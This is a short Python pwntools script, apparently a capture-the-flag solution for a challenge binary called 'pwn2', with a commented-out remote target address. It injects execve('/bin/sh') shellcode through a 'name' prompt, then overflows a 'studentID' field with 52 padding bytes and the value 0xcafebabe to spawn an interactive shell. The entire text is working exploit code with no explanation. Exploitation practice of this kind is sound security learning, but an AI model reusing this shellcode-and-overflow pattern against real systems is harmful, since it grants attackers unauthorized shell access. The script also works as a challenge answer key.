from pwn import *

exe = ELF('./pwn2', checksec=False)
p = process(exe.path)
# p = remote("14.225.255.41", 13333)

# input()
shellcode = asm(
    '''
    mov rax, 0x3b
    mov rdi, 29400045130965551
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx

    syscall
    ''', arch='amd64')

p.sendlineafter(b'name: ', shellcode)
payload = b'a'*52 + p32(0xcafebabe)
p.sendlineafter(b'studentID: ', payload)

p.interactive()
